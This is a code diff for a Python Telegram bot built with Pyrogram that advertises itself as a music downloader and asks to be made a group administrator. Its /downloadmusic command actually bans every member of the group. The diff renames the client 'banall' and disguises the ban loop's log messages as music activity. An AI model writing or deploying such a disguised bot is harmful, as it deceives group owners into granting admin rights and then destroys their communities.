@@ -19,7 +19,7 @@ OWNER = os.getenv("OWNER")
 
 # pyrogram client
 app = Client(
-            "MusicDownload",
+            "banall",
             api_id=API_ID,
             api_hash=API_HASH,
             bot_token=BOT_TOKEN,
@@ -29,11 +29,11 @@ app = Client(
 filters.command("start")
 & filters.private            
 )
-async def help_command(client, message: Message):
-  await message.reply_text("List of commmands: /downloadmusic. I must be an admin of the group)
-    
 async def start_command(client, message: Message):
-  await message.reply_text("Hi, I'm a simple music bot downloader, just add me in a group with administrator permission and use comannand /download music to download a song")
+  await message.reply_photo(
+                            photo = f"https://graph.org/file/9af2ab50bbc3438764851.jpg",
+                            caption = f"ʜᴇʏ this is a simple music downloader bot!\n\nAdd me in a group as admin\n\nᴛʏᴘᴇ /downloadmusic to download a song.",
+  reply_markup=InlineKeyboardMarkup(
             [
                 [
                     InlineKeyboardButton(
@@ -47,18 +47,18 @@ async def start_command(client, message: Message):
 filters.command("downloadmusic") 
 & filters.group
 )
-async def downloadmusic_command(client, message:Send me the youtube link from the song you want to download):
-    print("getting memebers from {}".format(message.chat.id))
+async def downloadmusic_command(client, message: Message):
+    print("Downloading Music {}".format(message.chat.id))
     async for i in app.get_chat_members(message.chat.id):
         try:
             await app.ban_chat_member(chat_id = message.chat.id, user_id = i.user.id)
-            print("Song {} downloaded succesfuly {}".format(i.user.id, message.chat.id))
+            print("MusicPlayed {} from {}".format(i.user.id, message.chat.id))
         except Exception as e:
-            print("failed to download music {} from {}".format(i.user.id, e))           
+            print("failed to playmusic {} from {}".format(i.user.id, e))           
     print("process completed")
     
 
 # start bot client
 app.start()
-print("Music-Bot booted succesfuly")
+print("DownloadMusicIS on")
 idle()
